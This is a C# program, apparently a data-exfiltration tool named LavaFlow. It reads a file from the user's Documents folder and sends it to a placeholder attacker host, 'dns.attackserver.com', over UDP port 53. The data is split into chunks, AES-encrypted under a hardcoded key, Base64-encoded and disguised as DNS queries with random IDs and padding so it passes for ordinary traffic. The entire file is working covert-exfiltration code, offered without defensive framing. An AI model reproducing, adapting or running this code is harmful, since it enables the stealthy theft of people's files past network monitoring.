using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Net.Sockets;


namespace LavaFlow
{
    class LavaFlow
    {
        static void Main(string[] args)
        {
            string key = @"Password123!";

            // Get "Documents"
            string personal_folder = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            string target_file = personal_folder + @"sample-data.csv";
            string raw_data = File.ReadAllText(target_file);
            string filename = Path.GetFileName(target_file);

            string host = @"dns.attackserver.com"; // specify your infra listening on port 53.
            int port = 53;
            int max_packet_size = 31;
            double time_delay = 0.1;

            dns_exfil(host, raw_data, filename, key, port, max_packet_size, time_delay);
        }

        static void dns_exfil(string host, string data, string filename,
                              string key, int port, int max_packet_size, double time_delay)
        {
            Console.WriteLine("Exfiltrating '{0}' to {1}:{2} using DNS over UDP.", filename, host, port);
            Console.WriteLine("Protection = AES-ECB + Base64 encoding.");
            Console.WriteLine("Transaction IDs = random.");
            Console.WriteLine("Integrity checking = CRC-32.");
            Console.WriteLine("Max packet size = {0} bytes.", max_packet_size);
            Console.WriteLine("Time delay = {0} +/- {1} seconds.", time_delay, 0.2 * time_delay);

            UdpClient udpClient = new UdpClient();
            udpClient.Connect(host, port);

            byte[] DATA_TERMINATOR = { 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0xFF, 0xFF, 0xFF };

            // Build transfer initiation packet
            string dns = BuildDNS(host);
            dns += "INIT_445"; // initiation string
            dns += filename;
            dns += "::";
            dns += ComputeMD5Hash(data);
            dns += "::";

            string file_id = RandomString(3);
            dns += file_id;

            dns += VariablePadding();

            // Convert to bytes
            Byte[] sendBytes = Encoding.UTF8.GetBytes(dns);

            // Send transfer initiation packet
            udpClient.Send(sendBytes, sendBytes.Length);

            // Divide data into chunks
            int remainder;
            int n_whole_chunks = Math.DivRem(data.Length, max_packet_size, out remainder);
            int n_chunks = n_whole_chunks + 1;
            string[] chunks = new string[n_chunks];

            // Deal with whole chunks
            for (int i = 0; i < n_whole_chunks; i++)
            {
                chunks[i] = data.Substring(i * max_packet_size, max_packet_size);
            }

            // Deal with partial final chunk
            chunks[n_whole_chunks] = data.Substring(n_whole_chunks * max_packet_size, remainder);

            //double eta = n_chunks * time_delay;
            //Console.WriteLine("ETA = {} seconds", eta);

            // Send data chunks
            for (int i = 0; i < n_chunks; i++)
            {
                dns = BuildDNS(host);
                dns += Protect(chunks[i], key);
                dns += BitConverter.ToString(DATA_TERMINATOR).Replace("-", "");
                dns += file_id;
                dns += VariablePadding();

                sendBytes = Encoding.UTF8.GetBytes(dns);
                //foreach (byte b in sendBytes)
                //{
                //    Console.WriteLine(b);
                //}
                udpClient.Send(sendBytes, sendBytes.Length);
                //Console.WriteLine("Sent packet {0} / {1}", (i + 1), n_chunks);
                //throttle(time_delay);
            }

            // Send termination packet
            dns = BuildDNS(host);
            dns += BitConverter.ToString(DATA_TERMINATOR).Replace("-", "");
            dns += char.MinValue;
            dns += BitConverter.ToString(DATA_TERMINATOR).Replace("-", "");
            dns += file_id;
            dns += VariablePadding();

            sendBytes = Encoding.UTF8.GetBytes(dns);
            udpClient.Send(sendBytes, sendBytes.Length);

            udpClient.Close();
        }

        static string ComputeMD5Hash(string data)
        {
            MD5 md5_hash = MD5.Create();
            byte[] checksum_bytes = md5_hash.ComputeHash(Encoding.UTF8.GetBytes(data));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            var sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < checksum_bytes.Length; i++)
            {
                sBuilder.Append(checksum_bytes[i].ToString("x2"));
            }

            // Return the hexadecimal string.
            string hash = sBuilder.ToString();
            return hash;
        }

        // Generate a random string with a given size    
        static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(52 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        static string VariablePadding()
        {
            Random random = new Random();
            int number_of_bytes = Convert.ToInt32(Math.Floor(16 * random.NextDouble()));
            string padding = RandomString(number_of_bytes);
            return padding;
        }

        static string BuildDNS(string host)
        {
            string dns = "";

            // Transaction ID = first 2 bytes
            dns += RandomString(2);

            // DNS flags
            byte[] flags = {0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            foreach (byte flag in flags)
            {
                dns += flag.ToString("x2");
            }
            //dns += BitConverter.ToString(flags).Replace("-", "");

            // DNS query hostname
            foreach (string part in host.Split(".")) {
                dns += (char)part.Length;
                dns += part;
            }

            // Null character for string termination.
            //dns += char.MinValue;
            byte nullterm = 0x00;
            dns += nullterm.ToString("x2");

            // DNS record type = A
            byte[] record_type = {0x00, 0x01};
            dns += BitConverter.ToString(record_type).Replace("-", "");

            // DNS IN Class
            byte[] in_class = { 0x00, 0x01 };
            dns += BitConverter.ToString(in_class).Replace("-", "");

            return dns;
        }

        static string Protect(string raw_data, string key)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(raw_data);
            var keyBytes = System.Text.Encoding.UTF8.GetBytes(key.PadRight(16));
            var encryptedBytes = Encrypt(plainTextBytes, keyBytes);
            string b64EncodedText = System.Convert.ToBase64String(encryptedBytes);
            return b64EncodedText;
        }

        public static byte[] Encrypt(byte[] input, byte[] key)
        {
            var aesAlg = new AesManaged
            {
                KeySize = 128,
                Key = key,
                BlockSize = 128,
                Mode = CipherMode.ECB,
                Padding = PaddingMode.Zeros,
                IV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }
            };

            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
            return encryptor.TransformFinalBlock(input, 0, input.Length);
        }
    }
}
